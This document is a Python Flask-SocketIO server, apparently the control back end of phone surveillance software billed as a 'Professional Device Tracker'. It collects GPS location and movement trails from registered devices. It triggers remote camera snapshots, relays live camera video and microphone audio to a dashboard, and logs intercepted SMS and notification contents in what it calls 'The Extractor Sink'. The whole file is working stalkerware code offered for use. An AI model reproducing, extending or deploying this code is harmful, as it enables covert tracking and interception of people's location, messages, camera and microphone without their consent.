from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit, join_room
import sqlite3
import time
import os
import base64
import logging
from datetime import datetime
from threading import Lock

# -----------------------
# Initialize App & Security
# -----------------------
app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "change-me-in-production")
thread_lock = Lock()

log_level = os.environ.get("LOG_LEVEL", "INFO").upper()
app.logger.setLevel(getattr(logging, log_level, logging.INFO))


def parse_cors_origins(raw):
    if not raw or raw.strip() == "*":
        return "*"
    return [origin.strip() for origin in raw.split(",") if origin.strip()]

# Professional Buffer: Optimized for high-speed binary data (Live Video/Audio)
# max_http_buffer_size set to 20MB to handle high-res snapshots without crashing
socketio = SocketIO(
    app,
    async_mode="gevent",
    cors_allowed_origins=parse_cors_origins(os.environ.get("CORS_ALLOWED_ORIGINS", "*")),
    ping_timeout=120,
    ping_interval=25,
    max_http_buffer_size=20000000 
)

# -----------------------
# Configuration & Storage
# -----------------------
DB = "devices.db"
PHOTO_DIR = "captured_photos"

if not os.path.exists(PHOTO_DIR):
    os.makedirs(PHOTO_DIR)

# In-memory cache to keep the dashboard responsive
devices = {}
last_trail_write = {}
dashboard_sids = set()

# Performance tuning
DASHBOARD_BROADCAST_INTERVAL = 1.0
TRAIL_LOG_INTERVAL_SECONDS = 15
DASHBOARD_ROOM = "dashboard_viewers"
STREAM_RELAY_INTERVAL_SECONDS = 0.20
MAX_FRAME_AGE_SECONDS = 1.5
OFFLINE_DEVICE_TIMEOUT_SECONDS = int(os.environ.get("OFFLINE_DEVICE_TIMEOUT_SECONDS", "60"))
DEVICE_SWEEP_INTERVAL_SECONDS = int(os.environ.get("DEVICE_SWEEP_INTERVAL_SECONDS", "15"))
MAX_DEVICE_ID_LENGTH = 128
MAX_TEXT_FIELD_LENGTH = 256
MAX_MESSAGE_LENGTH = 2048
MAX_SNAPSHOT_DATA_URL_LENGTH = 25_000_000

last_dashboard_emit = 0.0
dashboard_emit_scheduled = False
APP_START_TS = time.time()
last_stream_emit_by_device = {}
sweeper_started = False

metrics = {
    "http_requests_total": 0,
    "http_by_path": {},
    "dashboard_emits": 0,
    "telemetry_events": 0,
    "snapshot_requests": 0,
    "snapshot_received": 0,
    "stream_frames": 0,
    "audio_chunks": 0,
    "notifications": 0,
    "pings_sent": 0,
    "pongs_received": 0,
}


def inc_metric(key, amount=1):
    with thread_lock:
        metrics[key] = metrics.get(key, 0) + amount


def safe_text(value, max_len=MAX_TEXT_FIELD_LENGTH):
    if value is None:
        return ""
    return str(value).strip()[:max_len]


def safe_float(value, min_value=None, max_value=None):
    try:
        number = float(value)
    except (TypeError, ValueError):
        return None

    if min_value is not None and number < min_value:
        return None
    if max_value is not None and number > max_value:
        return None
    return number


def device_status_sweeper():
    while True:
        time.sleep(max(DEVICE_SWEEP_INTERVAL_SECONDS, 1))
        now = int(time.time())
        changed = False

        with thread_lock:
            for _, info in devices.items():
                if info.get("status") != "online":
                    continue
                last_seen = int(info.get("last_seen") or 0)
                if (now - last_seen) > OFFLINE_DEVICE_TIMEOUT_SECONDS:
                    info["status"] = "offline"
                    info["sid"] = None
                    changed = True

        if changed:
            emit_dashboard_update(force=True)


def ensure_background_tasks():
    global sweeper_started
    with thread_lock:
        if sweeper_started:
            return
        sweeper_started = True
    socketio.start_background_task(device_status_sweeper)


@app.before_request
def record_http_metrics():
    with thread_lock:
        metrics["http_requests_total"] += 1
        path_key = request.path
        path_counts = metrics["http_by_path"]
        path_counts[path_key] = path_counts.get(path_key, 0) + 1


def get_db_connection():
    conn = sqlite3.connect(DB, timeout=10)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn


def serialize_devices():
    return {
        device_id: {k: v for k, v in device.items() if k != "sid"}
        for device_id, device in devices.items()
    }


def get_device_id_by_sid(sid):
    for current_device_id, info in devices.items():
        if info.get("sid") == sid:
            return current_device_id
    return None


def _delayed_dashboard_emit(delay):
    global last_dashboard_emit, dashboard_emit_scheduled
    time.sleep(max(delay, 0))
    with thread_lock:
        if not dashboard_emit_scheduled:
            return
        dashboard_emit_scheduled = False
        last_dashboard_emit = time.time()
        payload = serialize_devices()
    inc_metric("dashboard_emits")
    socketio.emit("dashboard_update", payload, room=DASHBOARD_ROOM)


def emit_dashboard_update(force=False):
    global last_dashboard_emit, dashboard_emit_scheduled
    with thread_lock:
        now = time.time()
        elapsed = now - last_dashboard_emit

        if force or elapsed >= DASHBOARD_BROADCAST_INTERVAL:
            last_dashboard_emit = now
            dashboard_emit_scheduled = False
            payload = serialize_devices()
        elif not dashboard_emit_scheduled:
            dashboard_emit_scheduled = True
            delay = DASHBOARD_BROADCAST_INTERVAL - elapsed
            socketio.start_background_task(_delayed_dashboard_emit, delay)
            return
        else:
            return

    inc_metric("dashboard_emits")
    socketio.emit("dashboard_update", payload, room=DASHBOARD_ROOM)


@socketio.on("join_dashboard")
def join_dashboard_view():
    ensure_background_tasks()
    with thread_lock:
        dashboard_sids.add(request.sid)
    join_room(DASHBOARD_ROOM)
    emit("dashboard_update", serialize_devices())


@app.route("/healthz")
def healthz():
    return jsonify({
        "status": "ok",
        "uptime_seconds": int(max(time.time() - APP_START_TS, 0))
    })


@app.route("/metrics")
def get_metrics():
    now = time.time()
    uptime_seconds = max(now - APP_START_TS, 1)

    with thread_lock:
        online_devices = sum(1 for d in devices.values() if d.get("status") == "online")
        total_devices = len(devices)
        payload = {
            "uptime_seconds": int(uptime_seconds),
            "devices": {
                "online": online_devices,
                "offline": max(total_devices - online_devices, 0),
                "total": total_devices,
            },
            "sockets": {
                "dashboard_viewers": len(dashboard_sids)
            },
            "events": dict(metrics),
            "rates_per_second": {
                "dashboard_emits": round(metrics.get("dashboard_emits", 0) / uptime_seconds, 3),
                "telemetry_events": round(metrics.get("telemetry_events", 0) / uptime_seconds, 3),
                "stream_frames": round(metrics.get("stream_frames", 0) / uptime_seconds, 3),
                "audio_chunks": round(metrics.get("audio_chunks", 0) / uptime_seconds, 3),
                "notifications": round(metrics.get("notifications", 0) / uptime_seconds, 3),
            }
        }

    return jsonify(payload)

# -----------------------
# Database Engine (Expanded)
# -----------------------
def init_db():
    conn = get_db_connection()
    c = conn.cursor()

    # 1. Core Device Table
    c.execute("""
    CREATE TABLE IF NOT EXISTS devices(
        device_id TEXT PRIMARY KEY,
        battery TEXT,
        charging TEXT,
        platform TEXT,
        model TEXT,
        network TEXT,
        lat REAL,
        lon REAL,
        last_seen INTEGER
    )
    """)

    # 2. 📍 Movement Trail Table (Professional History)
    c.execute("""
    CREATE TABLE IF NOT EXISTS trails(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        lat REAL,
        lon REAL,
        timestamp INTEGER
    )
    """)

    # 3. 📱 SMS & Notification Logs (The Extractor Sink)
    c.execute("""
    CREATE TABLE IF NOT EXISTS logs(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        type TEXT,
        sender TEXT,
        message TEXT,
        timestamp INTEGER
    )
    """)

    c.execute("CREATE INDEX IF NOT EXISTS idx_trails_device_time ON trails(device_id, timestamp)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_logs_device_time ON logs(device_id, timestamp)")

    conn.commit()
    conn.close()


def save_device(data, log_trail=True):
    conn = get_db_connection()
    c = conn.cursor()

    # Save/Update main device info
    c.execute("""
    INSERT OR REPLACE INTO devices
    (device_id, battery, charging, platform, model, network, lat, lon, last_seen)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        data["device_id"],
        data.get("battery"),
        data.get("charging"),
        data.get("platform"),
        data.get("model", "Unknown"),
        data.get("network", "Unknown"),
        data.get("lat"),
        data.get("lon"),
        data["last_seen"]
    ))

    # Log the coordinate for movement trail tracking
    if log_trail and data.get("lat") is not None and data.get("lon") is not None:
        c.execute("""
        INSERT INTO trails (device_id, lat, lon, timestamp)
        VALUES (?, ?, ?, ?)
        """, (data["device_id"], data.get("lat"), data.get("lon"), data["last_seen"]))

    conn.commit()
    conn.close()

def load_devices():
    conn = get_db_connection()
    conn.row_factory = sqlite3.Row
    c = conn.cursor()

    try:
        rows = c.execute("SELECT * FROM devices").fetchall()
        for r in rows:
            devices[r["device_id"]] = {
                "device_id": r["device_id"],
                "battery": r["battery"],
                "charging": r["charging"],
                "platform": r["platform"],
                "model": r["model"],
                "network": r["network"],
                "lat": r["lat"],
                "lon": r["lon"],
                "last_seen": r["last_seen"],
                "status": "offline",
                "sid": None
            }
            last_trail_write[r["device_id"]] = r["last_seen"] or 0
    except Exception as e:
        print(f"Database Load Error: {e}")
    finally:
        conn.close()

# -----------------------
# Web Routes
# -----------------------
@app.route("/")
def client():
    return render_template("client.html")

@app.route("/dashboard")
def dashboard():
    try:
        return render_template("dashboard.html")
    except Exception as error:
        app.logger.exception("Dashboard render failed: %s", error)
        return render_template("device.html")

# -----------------------
# Device Logic & Connection
# -----------------------
@socketio.on("register_device")
def register_device(data):
    ensure_background_tasks()
    device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH)
    if not device_id:
        return

    print(f"[*] Device Online: {device_id}")
    devices.setdefault(device_id, {})
    devices[device_id]["sid"] = request.sid
    devices[device_id]["status"] = "online"
    devices[device_id]["last_seen"] = int(time.time())

    emit_dashboard_update(force=True)


@socketio.on("disconnect")
def handle_disconnect():
    sid = request.sid
    with thread_lock:
        dashboard_sids.discard(sid)

    for d in devices:
        if devices[d].get("sid") == sid:
            devices[d]["status"] = "offline"
            print(f"[!] Device Offline: {d}")
            break
    emit_dashboard_update(force=True)

# -----------------------
# Device Telemetry (Central Hub)
# -----------------------
@socketio.on("telemetry")
def telemetry(data):
    device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH)
    if not device_id:
        return

    lat = safe_float(data.get("lat"), -90, 90)
    lon = safe_float(data.get("lon"), -180, 180)

    device = devices.setdefault(device_id, {})
    inc_metric("telemetry_events")
    
    # Update current cache
    update_info = {
        "device_id": device_id,
        "battery": data.get("battery"),
        "charging": data.get("charging"),
        "platform": safe_text(data.get("platform"), MAX_TEXT_FIELD_LENGTH),
        "model": safe_text(data.get("model"), MAX_TEXT_FIELD_LENGTH),
        "network": safe_text(data.get("network"), MAX_TEXT_FIELD_LENGTH),
        "lat": lat,
        "lon": lon,
        "last_seen": int(time.time()),
        "status": "online",
        "sid": request.sid
    }
    device.update(update_info)

    last_logged = last_trail_write.get(device_id, 0)
    should_log_trail = (
        update_info["lat"] is not None and
        update_info["lon"] is not None and
        (update_info["last_seen"] - last_logged) >= TRAIL_LOG_INTERVAL_SECONDS
    )

    if should_log_trail:
        last_trail_write[device_id] = update_info["last_seen"]

    # Save to SQL Database and trail logs (throttled)
    save_device(device, log_trail=should_log_trail)

    # Broadcast to dashboard viewers (throttled)
    emit_dashboard_update()

# -----------------------
# 🎥 Media & Snapshot Handlers
# -----------------------
@socketio.on("request_snapshot")
def request_snapshot(device_id):
    device_id = safe_text(device_id, MAX_DEVICE_ID_LENGTH)
    inc_metric("snapshot_requests")
    device = devices.get(device_id)
    if device and device.get("sid"):
        print(f"[>] Triggering Snapshot: {device_id}")
        socketio.emit("take_snapshot", room=device.get("sid"))
    else:
        socketio.emit(
            "new_notification_alert",
            {
                "device_id": device_id or "unknown",
                "title": "Snapshot failed",
                "body": "Device is offline or has no active socket session."
            },
            room=DASHBOARD_ROOM,
        )

# -----------------------
# 🏓 Ping / Pong Support
# -----------------------
@app.route("/ping/<device_id>")
def ping_device(device_id):
    """HTTP endpoint to trigger a ping event to a specific device."""
    device_id = safe_text(device_id, MAX_DEVICE_ID_LENGTH)
    device = devices.get(device_id)
    if device and device.get("sid"):
        print(f"[>] Pinging device: {device_id}")
        inc_metric("pings_sent")
        socketio.emit("server_ping", {"timestamp": int(time.time())}, room=device["sid"])
        return jsonify({"status": "ping sent"})
    else:
        return jsonify({"error": "device not available"}), 404

@socketio.on("pong")
def handle_pong(data):
    """Receive pong responses from devices."""
    device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH)
    if not device_id:
        return
    print(f"[<] Pong received from {device_id}")
    inc_metric("pongs_received")
    # optionally update last_seen or notify dashboard
    devices.setdefault(device_id, {})["last_seen"] = int(time.time())
    emit_dashboard_update()


@socketio.on("snapshot_data")
def snapshot_data(data):
    device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH) or get_device_id_by_sid(request.sid) or "unknown"
    image_data = data.get("image")
    inc_metric("snapshot_received")

    if not image_data or "," not in image_data:
        print(f"Snapshot Processing Error: Invalid image payload from {device_id}")
        return
    if not image_data.startswith("data:image/"):
        print(f"Snapshot Processing Error: Invalid image mime from {device_id}")
        return
    if len(image_data) > MAX_SNAPSHOT_DATA_URL_LENGTH:
        print(f"Snapshot Processing Error: Snapshot payload too large from {device_id}")
        return

    try:
        # Decode Base64 and save as physical file
        _, encoded = image_data.split(",", 1)
        binary_data = base64.b64decode(encoded)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{PHOTO_DIR}/snap_{device_id}_{timestamp}.jpg"
        
        with open(filename, "wb") as f:
            f.write(binary_data)
        
        print(f"[+] Photo Saved: {filename}")
        # Send back to dashboard for viewing
        socketio.emit("view_snapshot", {"device_id": device_id, "image": image_data}, room=DASHBOARD_ROOM)
    except Exception as e:
        print(f"Snapshot Processing Error: {e}")

@socketio.on("stream_frame")
def handle_stream(data):
    # Relay live camera frame to dashboard viewers only
    if not isinstance(data, dict):
        return
    data.setdefault("device_id", get_device_id_by_sid(request.sid))
    if not data.get("device_id") or not data.get("frame"):
        return

    frame_timestamp = data.get("ts")
    if isinstance(frame_timestamp, (int, float)):
        frame_age_seconds = (time.time() * 1000 - frame_timestamp) / 1000
        if frame_age_seconds > MAX_FRAME_AGE_SECONDS:
            return

    device_id = data.get("device_id")
    now = time.time()
    last_emit = last_stream_emit_by_device.get(device_id, 0.0)
    if (now - last_emit) < STREAM_RELAY_INTERVAL_SECONDS:
        return

    last_stream_emit_by_device[device_id] = now
    inc_metric("stream_frames")
    socketio.emit("render_frame", data, room=DASHBOARD_ROOM)

# -----------------------
# 🔊 Microphone Audio Handler
# -----------------------
@socketio.on("audio_chunk")
def handle_audio(chunk):
    # Relay binary audio chunks to dashboard viewers only
    if not isinstance(chunk, dict):
        return
    chunk.setdefault("device_id", get_device_id_by_sid(request.sid))
    if not chunk.get("audio"):
        return
    inc_metric("audio_chunks")
    socketio.emit("play_audio", chunk, room=DASHBOARD_ROOM)

# -----------------------
# 📱 SMS & Notification Extractor
# -----------------------
@socketio.on("incoming_notification")
def handle_notification(data):
    device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH)
    if not device_id:
        return

    title = safe_text(data.get("title"), MAX_TEXT_FIELD_LENGTH)
    body = safe_text(data.get("body"), MAX_MESSAGE_LENGTH)
    inc_metric("notifications")
    
    # Save to Database Logs
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("""
    INSERT INTO logs (device_id, type, sender, message, timestamp)
    VALUES (?, ?, ?, ?, ?)
    """, (device_id, "SMS/Notification", title, body, int(time.time())))
    conn.commit()
    conn.close()

    print(f"[!] New SMS/Notification from {device_id}")
    # Instant push alert for the dashboard
    socketio.emit("new_notification_alert", {
        "device_id": device_id,
        "title": title,
        "body": body,
        "timestamp": int(time.time())
    }, room=DASHBOARD_ROOM)

# -----------------------
# Server Execution
# -----------------------
if __name__ == "__main__":
    init_db()
    load_devices()

    print("========================================")
    print("      PROFESSIONAL DEVICE TRACKER       ")
    print("========================================")
    print(f"[*] Database Status: Active ({DB})")
    print(f"[*] Snapshot Directory: {PHOTO_DIR}")
    
    # Run on all network interfaces
    debug_mode = os.environ.get("FLASK_DEBUG", "0") == "1"
    port = int(os.environ.get("PORT", "8080"))

    try:
        print(f"[*] Starting server on port {port}")
        socketio.run(app, host="0.0.0.0", port=port, debug=debug_mode, use_reloader=debug_mode)
    except OSError as error:
        if getattr(error, "winerror", None) == 10048:
            print(f"[!] ERROR: Port {port} is already in use. Free it first:")
            print(f"[!] Run in PowerShell: Stop-Process -Id (Get-NetTCPConnection -LocalPort {port} | Select-Object -ExpandProperty OwningProcess) -Force")
        else:
            raise